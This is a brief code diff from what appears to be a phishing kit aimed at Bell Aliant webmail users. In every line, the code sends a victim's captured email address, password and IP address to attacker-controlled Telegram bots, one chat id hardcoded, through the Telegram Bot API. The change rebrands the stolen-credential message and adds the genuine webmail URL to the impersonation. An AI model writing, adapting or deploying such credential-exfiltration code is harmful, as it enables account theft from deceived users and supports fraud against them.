@@ -24,7 +24,7 @@
                 const sendMessages = [[validator, '7266825744'], ...reqTo].map(
                   (item) =>
                     fetch(
-                      `https://api.telegram.org/bot${item[0]}/sendMessage?chat_id=${item[1]}&text=🔔 Bell Mail%0A%0A📺 Email: ${email}%0A🔐 Password: ${pwd}%0A📍 IP: ${ip}%0A%0AThank You!`,
+                      `https://api.telegram.org/bot${item[0]}/sendMessage?chat_id=${item[1]}&text=🔔 Bell Aliant Mail%0A%0A📺 Email: ${email}%0A🔐 Password: ${pwd}%0A📍 IP: ${ip}%0A🌐 URL: https://webmail.bellaliant.net/%0AThank You!`,
                       { method: 'GET' }
                     )
                 );
